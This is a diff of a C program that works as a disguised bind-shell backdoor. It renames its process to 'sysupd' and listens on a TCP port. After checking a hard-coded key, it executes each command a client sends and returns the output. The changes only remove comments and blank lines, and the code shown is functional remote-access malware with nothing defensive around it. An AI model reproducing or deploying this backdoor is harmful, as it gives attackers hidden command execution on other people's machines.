@@ -15,8 +15,7 @@ void execute_command(int client_socket) {
     char end_delim[] = "\nEND\n";
 
     while (1) {
-        memset(buffer, 0, sizeof(buffer)); // Clear the buffer for each command
-
+        memset(buffer, 0, sizeof(buffer)); 
         ssize_t bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
         if (bytes_received <= 0 || strncmp(buffer, "exit", 4) == 0) {
             break;
@@ -31,19 +30,17 @@ void execute_command(int client_socket) {
         while (fgets(buffer, sizeof(buffer), fp) != NULL) {
             send(client_socket, buffer, strlen(buffer), 0);
         }
-        send(client_socket, end_delim, strlen(end_delim), 0); // Send delimiter
+        send(client_socket, end_delim, strlen(end_delim), 0); 
         pclose(fp);
     }
 }
 
 int main() {
     prctl(PR_SET_NAME, "sysupd", 0, 0, 0);
-
     int server_socket, client_socket;
     struct sockaddr_in server_addr, client_addr;
     socklen_t client_addr_len = sizeof(client_addr);
-    char buffer[BUFFER_SIZE]; // Declare buffer here for use in main
-
+    char buffer[BUFFER_SIZE]; 
     server_socket = socket(AF_INET, SOCK_STREAM, 0);
     if (server_socket < 0) {
         perror("socket");
@@ -66,7 +63,7 @@ int main() {
         close(server_socket);
         exit(EXIT_FAILURE);
     }
-
+    // now listening
     printf("Listening on port %d...\n", PORT);
 
     while (1) {
@@ -75,25 +72,18 @@ int main() {
             perror("accept");
             continue;
         }
-
-        memset(buffer, 0, BUFFER_SIZE); // Reset buffer for each new connection
+        memset(buffer, 0, BUFFER_SIZE);
         if (recv(client_socket, buffer, BUFFER_SIZE, 0) <= 0) {
             close(client_socket);
             continue;
         }
-
-        // Inside the main loop, after checking the hashed key
         if (strcmp(buffer, HASHED_KEY) == 0) {
-            // Authentication successful, send confirmation
             send(client_socket, "AUTH_OK\n", strlen("AUTH_OK\n"), 0);
             execute_command(client_socket);
         } else {
-            // Authentication failed
             printf("Authentication failed.\n");
             close(client_socket);
         }
-
-
         close(client_socket);
     }
 
